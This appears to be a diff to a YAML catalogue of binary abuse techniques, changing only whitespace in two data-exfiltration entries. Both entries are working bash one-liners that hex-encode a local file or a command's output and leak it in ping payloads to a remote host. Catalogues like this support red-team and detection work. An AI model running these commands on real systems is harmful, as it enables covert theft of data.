@@ -25,14 +25,14 @@ data-exfiltration:
       Send local file content over ICMP using hex-encoded payloads.
     code: |
       hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++));
-	do printf "%02x" "'${line:$i:1}"; done; done < "$LFILE"); i=0;
-	while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
-	ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
+      do printf "%02x" "'${line:$i:1}"; done; done < "$LFILE"); i=0;
+      while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
+      ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
   - description: |
       Send command output over ICMP using hex-encoded payloads.
     code: |
-	hex=$(cmd="$($CMD)"; while IFS= read -r line; do for ((i=0; i<${#line}; i++));
-	do printf "%02x" "'${line:$i:1}"; done; done <<< "$cmd"); i=0;
-	while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
-	ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
+      hex=$(cmd="$($CMD)"; while IFS= read -r line; do for ((i=0; i<${#line}; i++));
+      do printf "%02x" "'${line:$i:1}"; done; done <<< "$cmd"); i=0;
+      while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}";
+      ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
 ---
